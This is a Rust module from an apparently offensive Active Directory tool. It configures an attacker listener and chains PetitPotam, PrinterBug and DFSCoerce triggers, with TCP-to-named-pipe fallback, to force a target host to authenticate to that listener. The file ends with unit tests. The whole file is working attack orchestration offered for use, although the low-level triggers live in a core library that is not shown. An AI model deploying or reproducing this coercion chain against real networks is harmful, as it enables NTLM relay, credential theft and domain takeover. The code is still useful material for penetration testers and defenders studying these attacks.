use overthrone_core::error::Result;
use overthrone_core::proto::{
    CoercionResult, trigger_dfs_coerce, trigger_petitpotam, trigger_printer_bug,
};
use serde::{Deserialize, Serialize};
use tracing::debug;

pub use overthrone_core::proto::coerce::CoerceProtocol;

/// Coercer with TCP preference support.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CoercerConfig {
    /// Target host to coerce
    pub target: String,
    /// Listener (attacker UNC path or IP)
    pub listener: String,
    /// Protocols to try
    pub protocols: Vec<CoerceProtocol>,
    /// Prefer TCP over SMB named pipes
    pub prefer_tcp: bool,
}

impl Default for CoercerConfig {
    fn default() -> Self {
        Self {
            target: String::new(),
            listener: String::new(),
            protocols: vec![CoerceProtocol::EfsRpc, CoerceProtocol::Rprn],
            prefer_tcp: false,
        }
    }
}

/// Coerce the target using the best available transport.
/// Tries TCP first if prefer_tcp is set, otherwise uses named pipe.
pub async fn coerce_with_fallback(config: &CoercerConfig) -> Result<CoercionResult> {
    let target = &config.target;
    let listener = &config.listener;

    for &protocol in &config.protocols {
        if config.prefer_tcp {
            match overthrone_core::proto::coerce::trigger_coerce_tcp(target, listener, protocol)
                .await
            {
                Ok(result) if result.success => return Ok(result),
                Ok(_) => debug!("TCP {} failed, falling back to named pipe", protocol.name()),
                Err(e) => debug!(
                    "TCP {} error: {e}, falling back to named pipe",
                    protocol.name()
                ),
            }
        }

        let result = match protocol {
            CoerceProtocol::EfsRpc => trigger_petitpotam(target, listener).await?,
            CoerceProtocol::Rprn => trigger_printer_bug(target, listener).await?,
            CoerceProtocol::EfsBackup => trigger_dfs_coerce(target, listener).await?,
        };

        if result.success {
            return Ok(result);
        }
    }

    Err(overthrone_core::error::OverthroneError::custom(
        "All coercion attempts failed",
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_coerce_protocol_uuids() {
        assert_eq!(CoerceProtocol::EfsRpc.uuid().len(), 16);
        assert_eq!(CoerceProtocol::Rprn.uuid().len(), 16);
        assert_eq!(CoerceProtocol::EfsBackup.uuid().len(), 16);
    }

    #[test]
    fn test_coerce_protocol_names() {
        assert_eq!(CoerceProtocol::EfsRpc.name(), "efsrpc");
        assert_eq!(CoerceProtocol::Rprn.name(), "spoolss");
        assert_eq!(CoerceProtocol::EfsBackup.name(), "netdfs");
    }

    #[test]
    fn test_coercer_config_default_protocols() {
        let config = CoercerConfig::default();
        assert!(config.protocols.contains(&CoerceProtocol::EfsRpc));
        assert!(config.protocols.contains(&CoerceProtocol::Rprn));
        assert!(!config.prefer_tcp);
    }

    #[test]
    fn test_coercer_config_default_empty_strings() {
        let config = CoercerConfig::default();
        assert!(config.target.is_empty());
        assert!(config.listener.is_empty());
    }
}
